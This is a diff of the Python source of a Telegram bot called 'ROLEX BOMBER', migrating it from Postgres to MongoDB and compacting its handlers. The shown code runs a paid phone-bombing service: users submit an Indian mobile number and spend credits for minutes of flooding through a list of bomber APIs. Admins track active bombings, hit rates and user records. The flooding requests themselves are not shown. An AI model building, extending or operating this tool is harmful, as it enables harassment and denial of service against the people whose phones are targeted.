-            bot.edit_message_text("❌ <b>Remove Channel</b>", chat_id, mid,
-                                  reply_markup=channel_remove_keyboard())
+        try: bot.edit_message_text("❌ <b>Remove Channel</b>", chat_id, mid, reply_markup=channel_remove_keyboard())
         except Exception: pass
 
     elif data == "adm_lookup":
@@ -1241,9 +1124,7 @@ def callback_handler(call):
         try: bot.answer_callback_query(call.id)
         except Exception: pass
         user_states[uid] = "adm_awaiting_uid"
-        try:
-            bot.edit_message_text("👥 <b>User Lookup</b>\n\nSend USER_ID",
-                                  chat_id, mid, reply_markup=back_keyboard())
+        try: bot.edit_message_text("👥 <b>User Lookup</b>\n\nSend USER_ID", chat_id, mid, reply_markup=back_keyboard())
         except Exception: pass
 
     elif data == "adm_stop_bot":
@@ -1251,9 +1132,7 @@ def callback_handler(call):
         BOT_PAUSED = True
         try: bot.answer_callback_query(call.id, "🔴 Paused.", show_alert=True)
         except Exception: pass
-        try:
-            bot.edit_message_text("🔴 <b>Bot PAUSED</b>", chat_id, mid,
-                                  reply_markup=admin_keyboard())
+        try: bot.edit_message_text("🔴 <b>Bot PAUSED</b>", chat_id, mid, reply_markup=admin_keyboard())
         except Exception: pass
 
     elif data == "adm_start_bot":
@@ -1261,9 +1140,7 @@ def callback_handler(call):
         BOT_PAUSED = False
         try: bot.answer_callback_query(call.id, "🟢 Resumed.", show_alert=True)
         except Exception: pass
-        try:
-            bot.edit_message_text("🟢 <b>Bot RUNNING</b>", chat_id, mid,
-                                  reply_markup=admin_keyboard())
+        try: bot.edit_message_text("🟢 <b>Bot RUNNING</b>", chat_id, mid, reply_markup=admin_keyboard())
         except Exception: pass
 
     elif data == "adm_broadcast":
@@ -1271,9 +1148,7 @@ def callback_handler(call):
         try: bot.answer_callback_query(call.id)
         except Exception: pass
         user_states[uid] = "adm_awaiting_broadcast"
-        try:
-            bot.edit_message_text("📢 <b>Broadcast</b>\n\nSend message. /cancel aborts.",
-                                  chat_id, mid, reply_markup=back_keyboard())
+        try: bot.edit_message_text("📢 <b>Broadcast</b>\n\nSend message. /cancel aborts.", chat_id, mid, reply_markup=back_keyboard())
         except Exception: pass
 
     elif data == "adm_active":
@@ -1300,9 +1175,7 @@ def callback_handler(call):
                     c += 1
         try: bot.answer_callback_query(call.id, f"Stopped {c}.", show_alert=True)
         except Exception: pass
-        try:
-            bot.edit_message_text(f"🧹 <b>Cleared {c}.</b>", chat_id, mid,
-                                  reply_markup=admin_keyboard())
+        try: bot.edit_message_text(f"🧹 <b>Cleared {c}.</b>", chat_id, mid, reply_markup=admin_keyboard())
         except Exception: pass
 
     elif data == "adm_backup":
@@ -1310,12 +1183,14 @@ def callback_handler(call):
         try: bot.answer_callback_query(call.id)
         except Exception: pass
         try:
-            rows = _exec("SELECT * FROM users", fetch="all")
+            rows = list(users_col.find({}))
+            # Convert _id to string so we can dump to text
+            for r in rows: r["_id"] = str(r["_id"])
             payload = "\n".join(str(r) for r in rows) or "(empty)"
             import io
             f = io.BytesIO(payload.encode())
             f.name = f"users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-            bot.send_document(chat_id, f, caption="💾 users table dump")
+            bot.send_document(chat_id, f, caption="💾 users collection dump")
         except Exception as e:
             try: bot.send_message(chat_id, f"❌ {esc(e)}")
             except Exception: pass
@@ -1323,12 +1198,9 @@ def callback_handler(call):
     elif data == "cancel_action":
         try: bot.answer_callback_query(call.id, "Cancelled.")
         except Exception: pass
-        try:
-            bot.edit_message_text("❌ Cancelled.", chat_id, mid,
-                                  reply_markup=main_menu_keyboard(uid))
+        try: bot.edit_message_text("❌ Cancelled.", chat_id, mid, reply_markup=main_menu_keyboard(uid))
         except Exception:
-            try: bot.send_message(chat_id, "❌ Cancelled.",
-                                  reply_markup=main_menu_keyboard(uid))
+            try: bot.send_message(chat_id, "❌ Cancelled.", reply_markup=main_menu_keyboard(uid))
             except Exception: pass
 
     else:
@@ -1347,14 +1219,12 @@ def text_handler(message):
         user_states.pop(uid, None)
         bot.send_message(chat_id, "❌ Cancelled.", reply_markup=main_menu_keyboard(uid))
         return
-    if text.startswith("/"):
-        return
+    if text.startswith("/"): return
 
     state = user_states.get(uid)
 
     if (FORCE_JOIN_ENABLED and uid not in ADMIN_IDS and not is_user_joined(uid)):
-        bot.send_message(chat_id, force_join_message(),
-                         reply_markup=force_join_keyboard())
+        bot.send_message(chat_id, force_join_message(), reply_markup=force_join_keyboard())
         return
 
     if BOT_PAUSED and uid not in ADMIN_IDS and state not in (
@@ -1367,84 +1237,53 @@ def text_handler(message):
     if state == "adm_awaiting_channel" and uid in ADMIN_IDS:
         user_states.pop(uid, None)
         if "|" not in text:
-            return bot.send_message(chat_id,
-                "❌ Format: <code>@user | Name</code>",
-                reply_markup=channel_manager_keyboard())
+            return bot.send_message(chat_id, "❌ Format: <code>@user | Name</code>", reply_markup=channel_manager_keyboard())
         cid, name = [x.strip() for x in text.split("|",1)]
         try:
             co = bot.get_chat(cid)
             title = co.title or name
-            if cid.startswith("@"):
-                url = f"https://t.me/{cid[1:]}"
-            elif getattr(co, "username", None):
-                url = f"https://t.me/{co.username}"
+            if cid.startswith("@"): url = f"https://t.me/{cid[1:]}"
+            elif getattr(co, "username", None): url = f"https://t.me/{co.username}"
             else:
                 try: url = bot.export_chat_invite_link(cid)
                 except Exception as e:
-                    return bot.send_message(chat_id,
-                        f"❌ Bot needs admin+invite permission.\n<i>{esc(str(e)[:150])}</i>",
-                        reply_markup=channel_manager_keyboard())
+                    return bot.send_message(chat_id, f"❌ Bot needs admin+invite permission.\n<i>{esc(str(e)[:150])}</i>", reply_markup=channel_manager_keyboard())
         except Exception as e:
-            return bot.send_message(chat_id,
-                f"❌ Can't access {esc(cid)}. Bot must be admin.\n<i>{esc(str(e)[:200])}</i>",
-                reply_markup=channel_manager_keyboard())
+            return bot.send_message(chat_id, f"❌ Can't access {esc(cid)}. Bot must be admin.\n<i>{esc(str(e)[:200])}</i>", reply_markup=channel_manager_keyboard())
         if not add_channel(cid, title, url):
-            return bot.send_message(chat_id,
-                f"⚠️ Already exists or DB fail.",
-                reply_markup=channel_manager_keyboard())
-        bot.send_message(chat_id,
-            f"✅ <b>Added</b>\n{esc(title)}\n<code>{esc(cid)}</code>",
-            reply_markup=channel_manager_keyboard())
+            return bot.send_message(chat_id, f"⚠️ Already exists or DB fail.", reply_markup=channel_manager_keyboard())
+        bot.send_message(chat_id, f"✅ <b>Added</b>\n{esc(title)}\n<code>{esc(cid)}</code>", reply_markup=channel_manager_keyboard())
         return
 
     if state == "awaiting_phone":
         user_states.pop(uid, None)
         phone = re.sub(r'[^0-9]', '', text)
-        if len(phone) == 12 and phone.startswith("91"):
-            phone = phone[2:]
+        if len(phone) == 12 and phone.startswith("91"): phone = phone[2:]
         if not re.match(r'^[6-9][0-9]{9}$', phone):
-            bot.send_message(chat_id,
-                "❌ Invalid. 10-digit Indian number (6-9).\n"
-                "Example: <code>9876543210</code>",
-                reply_markup=back_keyboard())
+            bot.send_message(chat_id, "❌ Invalid. 10-digit Indian number (6-9).\nExample: <code>9876543210</code>", reply_markup=back_keyboard())
             return
         user = get_user(uid)
         if not user or user["credits"] < 1:
-            bot.send_message(chat_id, "❌ No credits.",
-                             reply_markup=back_keyboard())
+            bot.send_message(chat_id, "❌ No credits.", reply_markup=back_keyboard())
             return
         kb = types.InlineKeyboardMarkup(row_width=2)
         mx = min(user["credits"], 10)
-        btns = [types.InlineKeyboardButton(
-            f"{i} ({i*5}min)", callback_data=f"use_credits_{phone}_{i}")
-            for i in range(1, mx+1)]
-        for i in range(0, len(btns), 2):
-            kb.row(*btns[i:i+2])
+        btns = [types.InlineKeyboardButton(f"{i} ({i*5}min)", callback_data=f"use_credits_{phone}_{i}") for i in range(1, mx+1)]
+        for i in range(0, len(btns), 2): kb.row(*btns[i:i+2])
         kb.add(types.InlineKeyboardButton("🔙 Cancel", callback_data="cancel_action"))
-        bot.send_message(chat_id,
-            f"📱 <b>{esc(phone)}</b>\n"
-            f"💰 <code>{user['credits']}</code>\n\nSelect credits:",
-            reply_markup=kb)
+        bot.send_message(chat_id, f"📱 <b>{esc(phone)}</b>\n💰 <code>{user['credits']}</code>\n\nSelect credits:", reply_markup=kb)
         return
 
     if state == "adm_add_credits" and uid in ADMIN_IDS:
         user_states.pop(uid, None)
         parts = text.split()
         if len(parts) != 2 or not parts[0].isdigit() or not parts[1].lstrip("-").isdigit():
-            return bot.send_message(chat_id, "❌ USER_ID AMOUNT",
-                                    reply_markup=admin_credits_keyboard())
+            return bot.send_message(chat_id, "❌ USER_ID AMOUNT", reply_markup=admin_credits_keyboard())
         t, a = parts[0], int(parts[1])
-        if a <= 0:
-            return bot.send_message(chat_id, "❌ Positive only.",
-                                    reply_markup=admin_credits_keyboard())
-        if not get_user(t):
-            return bot.send_message(chat_id, f"❌ No user {esc(t)}.",
-                                    reply_markup=admin_credits_keyboard())
-        add_credits(t, a)
-        u = get_user(t)
-        bot.send_message(chat_id,
-            f"✅ +{a} to <code>{esc(t)}</code>. Balance: <code>{u['credits']}</code>",
-            reply_markup=admin_credits_keyboard())
+        if a <= 0: return bot.send_message(chat_id, "❌ Positive only.", reply_markup=admin_credits_keyboard())
+        if not get_user(t): return bot.send_message(chat_id, f"❌ No user {esc(t)}.", reply_markup=admin_credits_keyboard())
+        add_credits(t, a); u = get_user(t)
+        bot.send_message(chat_id, f"✅ +{a} to <code>{esc(t)}</code>. Balance: <code>{u['credits']}</code>", reply_markup=admin_credits_keyboard())
         try: bot.send_message(int(t), f"🎁 +{a} credits!\n\n⌚ <b>ROLEX</b>")
         except Exception: pass
         return
@@ -1453,78 +1292,53 @@ def text_handler(message):
         user_states.pop(uid, None)
         parts = text.split()
         if len(parts) != 2 or not parts[0].isdigit() or not parts[1].isdigit():
-            return bot.send_message(chat_id, "❌ USER_ID AMOUNT",
-                                    reply_markup=admin_credits_keyboard())
+            return bot.send_message(chat_id, "❌ USER_ID AMOUNT", reply_markup=admin_credits_keyboard())
         t, a = parts[0], int(parts[1])
-        if not get_user(t):
-            return bot.send_message(chat_id, f"❌ No user {esc(t)}.",
-                                    reply_markup=admin_credits_keyboard())
-        sub_credits(t, a)
-        u = get_user(t)
-        bot.send_message(chat_id,
-            f"✅ -{a} from <code>{esc(t)}</code>. Balance: <code>{u['credits']}</code>",
-            reply_markup=admin_credits_keyboard())
+        if not get_user(t): return bot.send_message(chat_id, f"❌ No user {esc(t)}.", reply_markup=admin_credits_keyboard())
+        sub_credits(t, a); u = get_user(t)
+        bot.send_message(chat_id, f"✅ -{a} from <code>{esc(t)}</code>. Balance: <code>{u['credits']}</code>", reply_markup=admin_credits_keyboard())
         return
 
     if state == "adm_reset_credits" and uid in ADMIN_IDS:
         user_states.pop(uid, None)
         t = text.strip()
-        if not t.isdigit() or not get_user(t):
-            return bot.send_message(chat_id, "❌ Invalid USER_ID.",
-                                    reply_markup=admin_credits_keyboard())
+        if not t.isdigit() or not get_user(t): return bot.send_message(chat_id, "❌ Invalid USER_ID.", reply_markup=admin_credits_keyboard())
         update_user(t, credits=0)
-        bot.send_message(chat_id, f"✅ Reset {esc(t)} to 0.",
-                         reply_markup=admin_credits_keyboard())
+        bot.send_message(chat_id, f"✅ Reset {esc(t)} to 0.", reply_markup=admin_credits_keyboard())
         return
 
     if state == "adm_ban_user" and uid in ADMIN_IDS:
         user_states.pop(uid, None)
         t = text.strip()
-        if not t.isdigit() or not get_user(t):
-            return bot.send_message(chat_id, "❌ Invalid USER_ID.",
-                                    reply_markup=admin_ban_keyboard())
+        if not t.isdigit() or not get_user(t): return bot.send_message(chat_id, "❌ Invalid USER_ID.", reply_markup=admin_ban_keyboard())
         update_user(t, is_banned=1)
         with _bomb_lock:
             e = active_bombings.get(str(t))
             if e is not None: e["stop"] = True
-        bot.send_message(chat_id, f"🚫 Banned {esc(t)}.",
-                         reply_markup=admin_ban_keyboard())
+        bot.send_message(chat_id, f"🚫 Banned {esc(t)}.", reply_markup=admin_ban_keyboard())
         return
 
     if state == "adm_unban_user" and uid in ADMIN_IDS:
         user_states.pop(uid, None)
         t = text.strip()
-        if not t.isdigit() or not get_user(t):
-            return bot.send_message(chat_id, "❌ Invalid USER_ID.",
-                                    reply_markup=admin_ban_keyboard())
+        if not t.isdigit() or not get_user(t): return bot.send_message(chat_id, "❌ Invalid USER_ID.", reply_markup=admin_ban_keyboard())
         update_user(t, is_banned=0)
-        bot.send_message(chat_id, f"✅ Unbanned {esc(t)}.",
-                         reply_markup=admin_ban_keyboard())
+        bot.send_message(chat_id, f"✅ Unbanned {esc(t)}.", reply_markup=admin_ban_keyboard())
         return
 
     if state == "adm_awaiting_uid" and uid in ADMIN_IDS:
         user_states.pop(uid, None)
         t = text.strip()
-        if not t.isdigit():
-            return bot.send_message(chat_id, "❌ Invalid.",
-                                    reply_markup=admin_keyboard())
+        if not t.isdigit(): return bot.send_message(chat_id, "❌ Invalid.", reply_markup=admin_keyboard())
         u = get_user(t)
-        if not u:
-            return bot.send_message(chat_id, f"❌ No user {esc(t)}.",
-                                    reply_markup=admin_keyboard())
-        try:
-            j = datetime.fromisoformat(u["joined_date"]).strftime("%Y-%m-%d %H:%M")
-        except Exception:
-            j = "N/A"
+        if not u: return bot.send_message(chat_id, f"❌ No user {esc(t)}.", reply_markup=admin_keyboard())
+        try: j = datetime.fromisoformat(u["joined_date"]).strftime("%Y-%m-%d %H:%M")
+        except Exception: j = "N/A"
         bot.send_message(chat_id,
-            f"👤 <b>User</b>\n\n"
-            f"🆔 <code>{esc(u['user_id'])}</code>\n"
-            f"👤 @{esc(u['username'] or 'N/A')}\n"
-            f"💰 <code>{u['credits']}</code>\n"
-            f"💣 <code>{u['total_bombings']}</code>\n"
-            f"👥 <code>{u['refer_count']}</code>\n"
-            f"🔗 <code>{esc(u['referred_by'] or '—')}</code>\n"
-            f"📅 <code>{j}</code>\n"
+            f"👤 <b>User</b>\n\n🆔 <code>{esc(u['user_id'])}</code>\n"
+            f"👤 @{esc(u['username'] or 'N/A')}\n💰 <code>{u['credits']}</code>\n"
+            f"💣 <code>{u['total_bombings']}</code>\n👥 <code>{u['refer_count']}</code>\n"
+            f"🔗 <code>{esc(u['referred_by'] or '—')}</code>\n📅 <code>{j}</code>\n"
             f"🚫 <b>{'YES' if u['is_banned'] else 'NO'}</b>\n"
             f"⚡ <b>{'YES' if str(t) in active_bombings else 'NO'}</b>",
             reply_markup=admin_keyboard())
@@ -1532,18 +1346,14 @@ def text_handler(message):
 
     if state == "adm_awaiting_broadcast" and uid in ADMIN_IDS:
         user_states.pop(uid, None)
-        if not text.strip():
-            return bot.send_message(chat_id, "❌ Empty.",
-                                    reply_markup=admin_keyboard())
+        if not text.strip(): return bot.send_message(chat_id, "❌ Empty.", reply_markup=admin_keyboard())
         _do_broadcast(chat_id, text)
         return
 
-    bot.send_message(chat_id, "Send /start to open menu.",
-                     reply_markup=main_menu_keyboard(uid))
+    bot.send_message(chat_id, "Send /start to open menu.", reply_markup=main_menu_keyboard(uid))
 
 # ============= ADMIN COMMANDS =============
-def _is_admin(m):
-    return m.from_user.id in ADMIN_IDS
+def _is_admin(m): return m.from_user.id in ADMIN_IDS
 
 @bot.message_handler(commands=['addcredits'])
 def cmd_addcredits(m):
@@ -1557,8 +1367,7 @@ def cmd_addcredits(m):
         bot.reply_to(m, f"✅ +{a} → {esc(t)}. Bal: {u['credits']}")
         try: bot.send_message(int(t), f"🎁 +{a} credits!")
         except Exception: pass
-    except Exception as e:
-        bot.reply_to(m, f"❌ {esc(e)}")
+    except Exception as e: bot.reply_to(m, f"❌ {esc(e)}")
 
 @bot.message_handler(commands=['removecredits'])
 def cmd_removecredits(m):
@@ -1570,8 +1379,7 @@ def cmd_removecredits(m):
         if not get_user(t): return bot.reply_to(m, f"❌ No user {esc(t)}.")
         sub_credits(t, a); u = get_user(t)
         bot.reply_to(m, f"✅ -{a} → {esc(t)}. Bal: {u['credits']}")
-    except Exception as e:
-        bot.reply_to(m, f"❌ {esc(e)}")
+    except Exception as e: bot.reply_to(m, f"❌ {esc(e)}")
 
 @bot.message_handler(commands=['resetcredits'])
 def cmd_resetcredits(m):
@@ -1613,19 +1421,13 @@ def cmd_userinfo(m):
     if len(p) != 2: return bot.reply_to(m, "Usage: /userinfo UID")
     t = p[1]; u = get_user(t)
     if not u: return bot.reply_to(m, f"❌ No user {esc(t)}.")
-    try:
-        j = datetime.fromisoformat(u["joined_date"]).strftime("%Y-%m-%d %H:%M")
-    except Exception:
-        j = "N/A"
+    try: j = datetime.fromisoformat(u["joined_date"]).strftime("%Y-%m-%d %H:%M")
+    except Exception: j = "N/A"
     bot.reply_to(m,
-        f"👤 <b>User Info</b>\n\n"
-        f"🆔 <code>{esc(u['user_id'])}</code>\n"
-        f"👤 @{esc(u['username'] or 'N/A')}\n"
-        f"💰 <code>{u['credits']}</code>\n"
-        f"💣 <code>{u['total_bombings']}</code>\n"
-        f"👥 <code>{u['refer_count']}</code>\n"
-        f"🔗 <code>{esc(u['referred_by'] or '—')}</code>\n"
-        f"📅 <code>{j}</code>\n"
+        f"👤 <b>User Info</b>\n\n🆔 <code>{esc(u['user_id'])}</code>\n"
+        f"👤 @{esc(u['username'] or 'N/A')}\n💰 <code>{u['credits']}</code>\n"
+        f"💣 <code>{u['total_bombings']}</code>\n👥 <code>{u['refer_count']}</code>\n"
+        f"🔗 <code>{esc(u['referred_by'] or '—')}</code>\n📅 <code>{j}</code>\n"
         f"🚫 <b>{'YES' if u['is_banned'] else 'NO'}</b>\n"
         f"⚡ <b>{'YES' if str(t) in active_bombings else 'NO'}</b>")
 
@@ -1636,22 +1438,17 @@ def cmd_stats(m):
     hits = BOT_STATS["api_hits"]; succ = BOT_STATS["api_success"]
     hr = (succ / hits * 100) if hits else 0
     bot.reply_to(m,
-        f"📊 <b>Stats</b>\n\n"
-        f"👥 <code>{s['users']}</code> (banned: <code>{s['banned']}</code>)\n"
-        f"💣 <code>{s['sessions']}</code>\n"
-        f"⚡ <code>{len(active_bombings)}</code>\n"
-        f"💰 <code>{s['credits']}</code>\n"
-        f"🔗 <code>{len(BOMBER_APIS)}</code>\n\n"
-        f"Hits: <code>{hits}</code>\n"
-        f"Success: <code>{hr:.1f}%</code>\n"
+        f"📊 <b>Stats</b>\n\n👥 <code>{s['users']}</code> (banned: <code>{s['banned']}</code>)\n"
+        f"💣 <code>{s['sessions']}</code>\n⚡ <code>{len(active_bombings)}</code>\n"
+        f"💰 <code>{s['credits']}</code>\n🔗 <code>{len(BOMBER_APIS)}</code>\n\n"
+        f"Hits: <code>{hits}</code>\nSuccess: <code>{hr:.1f}%</code>\n"
         f"Uptime: <code>{int(time.time() - BOT_START_TIME)}s</code>")
 
 @bot.message_handler(commands=['broadcast'])
 def cmd_broadcast(m):
     if not _is_admin(m): return bot.reply_to(m, "❌")
     p = (m.text or "").split(maxsplit=1)
-    if len(p) < 2 or not p[1].strip():
-        return bot.reply_to(m, "Usage: /broadcast message")
+    if len(p) < 2 or not p[1].strip(): return bot.reply_to(m, "Usage: /broadcast message")
     _do_broadcast(m.chat.id, p[1].strip())
 
 @bot.message_handler(commands=['stopbombings'])
@@ -1661,8 +1458,7 @@ def cmd_stopbombings(m):
     with _bomb_lock:
         for k in list(active_bombings.keys()):
             e = active_bombings.get(k)
-            if e is not None:
-                e["stop"] = True; c += 1
+            if e is not None: e["stop"] = True; c += 1
     bot.reply_to(m, f"🛑 Stopped {c}.")
 
 @bot.message_handler(commands=['stopbot'])
@@ -1683,8 +1479,7 @@ def cmd_startbot(m):
 def cmd_addchannel(m):
     if not _is_admin(m): return
     p = (m.text or "").split(maxsplit=1)
-    if len(p) < 2 or "|" not in p[1]:
-        return bot.reply_to(m, "Usage: /addchannel @user | Name")
+    if len(p) < 2 or "|" not in p[1]: return bot.reply_to(m, "Usage: /addchannel @user | Name")
     cid, name = [x.strip() for x in p[1].split("|",1)]
     try:
         co = bot.get_chat(cid)
@@ -1693,24 +1488,18 @@ def cmd_addchannel(m):
         elif getattr(co, "username", None): url = f"https://t.me/{co.username}"
         else:
             try: url = bot.export_chat_invite_link(cid)
-            except Exception as e:
-                return bot.reply_to(m, f"❌ Need admin+invite perm.\n{esc(str(e)[:150])}")
-    except Exception as e:
-        return bot.reply_to(m, f"❌ {esc(str(e)[:150])}")
-    if add_channel(cid, title, url):
-        bot.reply_to(m, f"✅ Added <b>{esc(title)}</b>")
-    else:
-        bot.reply_to(m, "⚠️ Exists or DB fail.")
+            except Exception as e: return bot.reply_to(m, f"❌ Need admin+invite perm.\n{esc(str(e)[:150])}")
+    except Exception as e: return bot.reply_to(m, f"❌ {esc(str(e)[:150])}")
+    if add_channel(cid, title, url): bot.reply_to(m, f"✅ Added <b>{esc(title)}</b>")
+    else: bot.reply_to(m, "⚠️ Exists or DB fail.")
 
 @bot.message_handler(commands=['delchannel'])
 def cmd_delchannel(m):
     if not _is_admin(m): return
     p = (m.text or "").split()
     if len(p) != 2: return bot.reply_to(m, "Usage: /delchannel @user")
-    if remove_channel(p[1]):
-        bot.reply_to(m, f"✅ Removed {esc(p[1])}")
-    else:
-        bot.reply_to(m, "❌ Not found.")
+    if remove_channel(p[1]): bot.reply_to(m, f"✅ Removed {esc(p[1])}")
+    else: bot.reply_to(m, "❌ Not found.")
 
 @bot.message_handler(commands=['listchannels'])
 def cmd_listchannels(m):
@@ -1725,16 +1514,19 @@ def cmd_listchannels(m):
 
 # ============= MAIN =============
 if __name__ == "__main__":
-    if not BOT_TOKEN:
-        raise SystemExit("BOT_TOKEN env var missing")
-    if not DATABASE_URL:
-        raise SystemExit("DATABASE_URL env var missing")
-    init_db()
-    sweep_orphans()
+    if not BOT_TOKEN: raise SystemExit("BOT_TOKEN env var missing")
+    if not MONGODB_URI: raise SystemExit("MONGODB_URI env var missing")
+    try:
+        init_db()
+        sweep_orphans()
+    except Exception as e:
+        print(f"❌ DATABASE CONNECTION FAILED: {e}")
+        raise SystemExit(1)
+
     _start_health_server()
     threading.Thread(target=_keepalive, daemon=True).start()
     print("=" * 56)
-    print("  ROLEX BOMBER — POSTGRES / RENDER EDITION")
+    print("  ROLEX BOMBER — MONGODB / RENDER EDITION")
     print("=" * 56)
     print(f"APIs loaded : {len(BOMBER_APIS)}")
     print(f"Workers     : {CONCURRENT_WORKERS}")
@@ -1743,8 +1535,7 @@ if __name__ == "__main__":
     print("Running.\n")
     while True:
         try:
-            bot.infinity_polling(timeout=30, long_polling_timeout=25,
-                                 skip_pending=True)
+            bot.infinity_polling(timeout=30, long_polling_timeout=25, skip_pending=True)
         except Exception as e:
             print(f"polling died: {e} — restarting in 5s")
             time.sleep(5)
